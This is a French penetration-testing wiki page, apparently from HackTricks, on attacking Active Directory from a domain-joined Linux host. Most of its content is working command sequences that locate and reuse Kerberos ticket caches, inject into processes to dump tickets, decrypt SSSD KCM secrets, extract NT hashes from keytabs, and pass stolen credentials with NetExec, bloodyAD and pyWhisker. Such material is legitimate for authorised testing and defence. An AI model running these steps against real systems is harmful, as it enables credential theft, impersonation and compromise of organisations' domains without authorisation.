# Active Directory sous Linux

{{#include ../../banners/hacktricks-training.md}}

Une machine Linux peut également être présente dans un environnement Active Directory.

Une machine Linux au sein d'un AD peut **stocker localement du matériel Kerberos** : des ccaches utilisateur, des keytabs de machine/service et des secrets gérés par SSSD. Ces artefacts peuvent généralement être réutilisés comme n'importe quelle autre credential Kerberos. Pour lire la plupart d'entre eux, vous devrez être l'utilisateur propriétaire du ticket ou **root** sur la machine.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Énumération

### Énumération AD depuis Linux

Si vous avez accès à un AD depuis Linux (ou à bash sous Windows), vous pouvez utiliser [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) pour énumérer l'AD.

Vous pouvez également consulter la page suivante pour découvrir **d'autres moyens d'énumérer un AD depuis Linux** :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA est une **alternative** open source à **Active Directory** de Microsoft Windows, principalement destinée aux environnements **Unix**. Il combine un **annuaire LDAP** complet avec un centre de distribution de clés MIT **Kerberos** pour une gestion similaire à celle d'Active Directory. En utilisant le **Certificate System** Dogtag pour la gestion des certificats CA et RA, il prend en charge l'authentification **multi-factor**, notamment avec des cartes à puce. SSSD est intégré aux processus d'authentification Unix.<sup>[[14]](#references)[[15]](#references)</sup> Pour en savoir plus :


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefacts d'un hôte joint au domaine

Avant de manipuler les tickets, identifiez **comment l'hôte a été joint à l'AD** et **où le matériel Kerberos est réellement stocké**. Sur les hôtes Linux modernes, cela est généralement géré par `realmd` + `adcli` + `sssd`, et pas uniquement par des fichiers statiques dans `/tmp`.<sup>[[10]](#references)</sup>
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Cela vous indique rapidement si l’hôte fait confiance à AD, si SSSD met en cache les identités ou les tickets, et si des **machine/service keytabs** ou des **KCM secrets** sont disponibles pour être exploités.<sup>[[4]](#references)[[10]](#references)</sup>

## Jouer avec les tickets

### Pass The Ticket

Sur cette page, vous trouverez différents emplacements où vous pouvez **trouver des tickets Kerberos sur un hôte Linux**. Sur la page suivante, vous apprendrez à transformer ces formats de tickets CCache en Kirbi (le format nécessaire sous Windows), ainsi qu’à effectuer une attaque PTT :


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Si vous voulez consulter les **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, etc.), consultez la page dédiée :

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Réutilisation de tickets CCACHE depuis /tmp

Les fichiers CCACHE sont des formats binaires permettant de **stocker des identifiants Kerberos**. `FILE:/tmp/krb5cc_%{uid}` reste courant, mais les déploiements Linux modernes utilisent également `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` ou `KCM:%{uid}`. Vérifiez la variable d’environnement **`KRB5CCNAME`** et le paramètre `default_ccache_name` avant de supposer que les tickets se trouvent dans `/tmp`.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Réutilisation de tickets CCACHE depuis le keyring

**Les tickets Kerberos stockés dans la mémoire d'un processus peuvent être extraits**, en particulier lorsque la protection ptrace de la machine est désactivée (`/proc/sys/kernel/yama/ptrace_scope`). Un outil utile à cette fin est disponible à l'adresse [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) ; il facilite l'extraction en s'injectant dans les sessions et en dumpant les tickets dans `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Pour configurer et utiliser cet outil, suivez les étapes ci-dessous :
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Cette procédure tentera d’injecter du code dans différentes sessions, en indiquant la réussite en stockant les tickets extraits dans `/tmp` selon la convention de nommage `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Réutilisation de tickets CCACHE depuis SSSD KCM

SSSD conserve une copie de la base de données à l’emplacement `/var/lib/sss/secrets/secrets.ldb`. La clé correspondante est stockée dans un fichier caché à l’emplacement `/var/lib/sss/secrets/.secrets.mkey`. Par défaut, la clé est uniquement lisible si vous disposez des permissions **root**.<sup>[[4]](#references)</sup>

L’appel de **`SSSDKCMExtractor`** avec les paramètres --database et --key analysera la base de données et **déchiffrera les secrets**.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
L’extracteur affiche les payloads JSON Kerberos bruts ; convertissez-les en cache de tickets exploitable ou dans un autre format de ticket avant les opérations pass-the-cache/pass-the-ticket.<sup>[[4]](#references)</sup>

### Triage rapide des keytabs
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Extraire les comptes depuis /etc/krb5.keytab

Les clés des comptes de service, essentielles aux services fonctionnant avec des privilèges root, sont stockées de manière sécurisée dans les fichiers **`/etc/krb5.keytab`**. Ces clés, comparables aux mots de passe des services, doivent rester strictement confidentielles.<sup>[[5]](#references)</sup>

Pour inspecter le contenu du fichier keytab, **`klist`** peut être utilisé. Sous Linux, `klist -k -K -e` affiche les principals, les numéros de version des clés, les types de chiffrement et le matériel de clé brut. Si le type de clé est **23 / RC4-HMAC**, la valeur de la clé correspond également au **NT hash** de ce principal.<sup>[[6]](#references)[[17]](#references)</sup>
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Pour les utilisateurs Linux, **`KeyTabExtract`** permet d’extraire le hash RC4 HMAC, qui peut être utilisé pour la réutilisation de hash NTLM. Notez que cela ne fonctionne que lorsque le keytab contient encore du matériel **etype 23 / RC4-HMAC**. Dans les environnements **AES-only**, vous n’obtiendrez peut-être pas de hash NT réutilisable, mais vous pourrez toujours vous authentifier directement avec le keytab via Kerberos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Sur macOS, **`bifrost`** sert d'outil pour l'analyse des fichiers keytab.<sup>[[8]](#references)</sup>
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
En utilisant les informations de compte et de hash extraites, des connexions aux serveurs peuvent être établies à l’aide d’outils tels que **`NetExec`**.<sup>[[9]](#references)</sup>
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```
### Réutiliser le compte machine de `/etc/krb5.keytab`

Sur les systèmes joints avec `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` contient généralement le **compte ordinateur** ainsi qu'un ou plusieurs **principals host/service**. Si vous avez les privilèges **root**, ne le dump pas directement : utilisez l'un des principals listés par `klist -k` pour demander un TGT et opérer en tant que l'hôte Linux lui-même.<sup>[[10]](#references)</sup>
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Cela est particulièrement utile lorsque **l’objet ordinateur** dispose lui-même de droits délégués dans AD ou lorsque l’hôte est autorisé à récupérer d’autres secrets, tels qu’un **gMSA**.<sup>[[13]](#references)</sup>

### Réutiliser du matériel Kerberos volé avec des outils AD orientés Linux

Une fois que vous disposez d’un `ccache` valide ou d’un keytab utilisable, vous pouvez interagir avec AD **directement depuis Linux** sans tout convertir au préalable dans des formats Windows. De nombreux outils modernes acceptent nativement `KRB5CCNAME` / l’authentification Kerberos.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Ceci constitue un bon pont entre la **post-exploitation Linux** et l’**abus d’objets AD**. Pour les chemins d’abus au niveau des objets eux-mêmes, consultez :

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefacts Linux gMSA / Managed Service Account

Les déploiements Linux récents peuvent consommer directement des **Managed Service Accounts** depuis AD. En pratique, cela signifie qu’après la compromission d’un serveur Linux, vous pouvez trouver non seulement le keytab de l’hôte, mais aussi des **keytabs spécifiques aux services** générés à partir d’un gMSA. Les emplacements courants à inspecter sont `/etc/gmsad.conf`, les fichiers de configuration spécifiques au déploiement et les fichiers `*.keytab` supplémentaires sous `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Cela vous fournit une identité Kerberos réutilisable pour les SPN associés à ce gMSA **sans toucher à aucun endpoint Windows**.<sup>[[13]](#references)</sup> Pour les abus de gMSA/dMSA **côté domaine** après l'obtention de privilèges élevés dans AD, consultez :

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II) : Comment attaquer Kerberos ?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Accéder à AD avec un managed service account – Intégrer directement les systèmes RHEL à Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Variables d'environnement Kerberos – Documentation MIT Kerberos](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – Documentation MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757 : Les types de chiffrement Kerberos RC4-HMAC utilisés par Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Utiliser Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Découvrir et rejoindre des Identity Domains | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Guide utilisateur de bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [À propos | Documentation FreeIPA](https://www.freeipa.org/About.html)
- [15] [Notes de version de FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Documentation du kernel Linux](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – Documentation MIT Kerberos](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
